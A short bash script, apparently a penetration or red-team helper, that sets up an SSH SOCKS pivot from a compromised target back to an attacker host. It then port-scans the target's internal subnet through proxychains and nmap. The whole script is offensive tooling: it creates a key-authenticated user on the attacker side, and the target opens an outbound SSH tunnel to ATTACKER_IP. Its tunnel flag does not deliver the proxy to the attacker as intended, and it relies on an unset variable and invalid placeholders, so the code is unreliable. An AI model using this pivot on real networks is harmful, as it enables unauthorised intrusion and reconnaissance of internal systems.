#!/bin/bash

# attacker
apt-get update && apt-get install -y proxychains
adduser --gecos "" --disabled-password "socksuser" || echo "socksuser user already exists"
mkdir -p /home/socksuser/.ssh 2>&1 | tee -a $LOGFILE
ssh-keygen -t rsa -N '' -b 4096 -f /home/socksuser/.ssh/socksuser_key 2>&1 | tee -a $LOGFILE
cat /home/socksuser/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE
chown -R socksuser:socksuser /home/socksuser
chmod 600 /home/socksuser/.ssh/authorized_keys 2>&1 | tee -a $LOGFILE

# target
KEY="${ YOUR SSH KEY HERE INSIDE }"
ATTACKER_IP=${ ATTACKER IP }
echo "${KEY}" | ssh -q -i /dev/stdin -f -N -D 9050 socksuser@${ATTACKER_IP}
IP_AND_MASK=$(ip -o -f inet addr show | awk '/scope global/ {print $4}')

# attacker
proxychains nmap -Pn -p- $IP_AND_MASK